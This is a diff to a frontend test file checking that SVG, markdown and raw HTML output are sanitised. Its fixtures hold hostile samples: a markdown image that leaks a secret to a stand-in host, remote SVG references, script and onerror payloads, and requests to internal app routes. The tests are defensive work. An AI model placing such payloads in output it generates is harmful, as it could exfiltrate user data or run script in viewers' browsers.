@@ -81,9 +81,10 @@ describe('svg output', () => {
  <a xlink:href="https://evil.example/"><text>link</text></a>
  <image xlink:href="https://evil.example/svg.png" width="5" height="5"/>
  <image id="embedded" xlink:href="data:image/png;base64,iVBORw0KGgo=" width="5" height="5"/>
+ <use xlink:href="https://evil.example/marks.svg#dot" x="15" y="5"/>
 </svg>`
 
-  test('an svg figure keeps its drawing and loses script, style, html, links and remote images', async () => {
+  test('an svg figure keeps its drawing and loses script, style, html, links, remote images and remote uses', async () => {
     const el = await mount(<Output bundle={{ 'image/svg+xml': svg }} />)
     const root = el.querySelector('svg')
     expect(root).not.toBeNull()
@@ -96,29 +97,19 @@ describe('svg output', () => {
 })
 
 describe('markdown', () => {
-  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media?path=a.png)'
-
-  test('a markdown image from another host is drawn as its alt text, in an output and in the chat', async () => {
+  test('markdown a model wrote loads nothing but the media routes, and its raw html shows as text', async () => {
+    const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media?path=a.png) ![x](/api/events?cwd=/c&session=s)'
     for (const node of [<Output bundle={{ 'text/markdown': md }} />, <ChatMarkdown text={md} />]) {
       const el = await mount(node)
-      const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
-      expect(srcs).toEqual(['/api/ws/w/media?path=a.png'])
+      expect(Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))).toEqual(['/api/ws/w/media?path=a.png'])
+      // an image from another host is drawn as its alt text
       expect(el.textContent).toContain('leak')
     }
-  })
-
-  test('markdown and sanitized HTML load no app route but the media routes', async () => {
-    const el = await mount(<ChatMarkdown text={'![x](/api/events?cwd=/c&session=s) ![y](/api/ws/w/media?path=a.png)'} />)
-    const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
-    expect(srcs).toEqual(['/api/ws/w/media?path=a.png'])
     const out = purifyHtml('<img src="/api/events?cwd=/c"><img src="/api/ws/w/media?path=b.png"><div style="background:url(/api/events)">d</div>')
     expect(out).not.toContain('/api/events')
     expect(out).toContain('/api/ws/w/media?path=b.png')
-  })
-
-  test('raw html in chat markdown is shown as text, never parsed', async () => {
-    const el = await mount(<ChatMarkdown text={'<img src=x onerror="window.__pwned = 7"> <script>window.__pwned = 8</script>'} />)
-    expect(el.querySelector('img, script')).toBeNull()
+    const raw = await mount(<ChatMarkdown text={'<img src=x onerror="window.__pwned = 7"> <script>window.__pwned = 8</script>'} />)
+    expect(raw.querySelector('img, script')).toBeNull()
     expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
   })
 })
